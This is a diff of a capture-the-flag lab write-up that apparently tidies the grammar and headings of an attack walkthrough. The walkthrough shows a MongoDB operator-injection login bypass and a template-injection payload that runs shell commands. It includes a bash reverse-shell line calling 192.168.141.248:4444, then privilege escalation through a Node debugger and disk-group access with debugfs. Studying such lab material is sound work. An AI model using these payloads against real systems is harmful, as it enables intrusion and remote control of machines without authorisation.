@@ -22,27 +22,29 @@ comments: false
 
 ---
 
-# Recon
+## Reconnaissance
 
-Scan for port opening using `rustscan`
+Scan for open ports using `rustscan`
 
-Port 22 (SSH) and 80 (HTTP) are opening.
+Ports 22 (SSH) and 80 (HTTP) are open.
 
 ![image-1425](/assets/img/obsidian/do-not-disturb/image-1425.png)
 
 ![image-1426](/assets/img/obsidian/do-not-disturb/image-1426.png)
 
-So, let's check website first.
+So, let's check the website first.
 
 ![image-1427](/assets/img/obsidian/do-not-disturb/image-1427.png)
 
 ![image-1428](/assets/img/obsidian/do-not-disturb/image-1428.png)
 
+## Login Bypass
+
 `curl -i -s -c cookie.txt -d 'username=attendant&password[$ne]=x' http://10.48.173.139/login`
 
-If the server is vuln and direcly uses the parsed input in MongoDB query
+If the server is vuln and directly uses the parsed input in a `MongoDB` query,
 
-this turn 
+this turns 
 
 ```js
 { username: "attendant", password: "x" }
@@ -60,11 +62,13 @@ If such a query is accepted without proper validation, it can potentially result
 
 ![image-1429](/assets/img/obsidian/do-not-disturb/image-1429.png)
 
-We got cookie at /staff location
+We got a cookie at the `/staff `location
 
 ![image-1430](/assets/img/obsidian/do-not-disturb/image-1430.png)
 
-Now, we gonna perform template injection
+## Template Injection
+
+Now, we're gonna perform **template injection**
 
 ```bash
  curl -s -b cookie.txt --data-urlencode 'template=<%=7*7%>' http://10.48.173.139/staff/preview
@@ -72,7 +76,7 @@ Now, we gonna perform template injection
 
 ![image-1431](/assets/img/obsidian/do-not-disturb/image-1431.png)
 
-and we can see that they accept our injected template. So, now let's inject feather template to do reverse shell
+and we can see that they accept our injected template. So, now let's inject another template to do a **reverse shell**
 
 ```bash
 curl -s -b cookie.txt --data-urlencode 'template=<%=global.process.mainModule.require("child_process").execSync("id").toString() %>' http://10.48.173.139/staff/preview
@@ -85,29 +89,32 @@ curl -s -b cookie.txt --data-urlencode 'template=<%=global.process.mainModule.re
 curl -s -b cookie.txt --data-urlencode "template=<%= global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/192.168.141.248/4444 0>&1\"').toString() %>" http://10.48.173.139/staff/preview 
 ```
 
-Reverse shell
-
+## Reverse shell
 ![image-1433](/assets/img/obsidian/do-not-disturb/image-1433.png)
 
 ![image-1434](/assets/img/obsidian/do-not-disturb/image-1434.png)
 
 ![image-1435](/assets/img/obsidian/do-not-disturb/image-1435.png)
 
-Fount first flag at `/home/poolside/user.txt`
+Found the first flag at `/home/poolside/user.txt`
 
 ![image-1436](/assets/img/obsidian/do-not-disturb/image-1436.png)
 
-and we found **processor.js** file
+## Node Debugger
+
+and we found the `processor.js` file
 
 ![image-1437](/assets/img/obsidian/do-not-disturb/image-1437.png)
 
-and this running as loop, so this mean it keep running at the background
+and this is running in a loop, so this means it keeps running in the background
 
 ![image-1438](/assets/img/obsidian/do-not-disturb/image-1438.png)
 
-We found that it use port 9229 with --inspect flag and connect using node
+The process is listening for debugging on `127.0.0.1:9229`. Since we already have a shell on this machine, let's connect to that debugger.
 
-So, we will use this following commands 
+We found that it uses **port 9229** with the **--inspect** flag and connects using node
+
+So, we will use the following commands 
 
 ```bash
 node inspect 127.0.0.1:9229
@@ -122,9 +129,15 @@ process.getBuiltinModule('child_process').execSync("ls -l /dev/sd* /dev/vd* /dev
 
 ![image-1439](/assets/img/obsidian/do-not-disturb/image-1439.png)
 
-It show we are in group disk.
+The debugger runs our commands as `pipelinesvc`, and `id` shows this account belongs to the `disk` group. So, we now have a different user's permissions through the Node process.
+
+It shows we are in the disk group.
 
 ![image-1440](/assets/img/obsidian/do-not-disturb/image-1440.png)
+
+## Read the Root Flag
+
+The disk group can access `/dev/nvme0n1p1` directly. Let's use `debugfs` to read the filesystem on that partition and look inside `/root`.
 
 
 ```bash
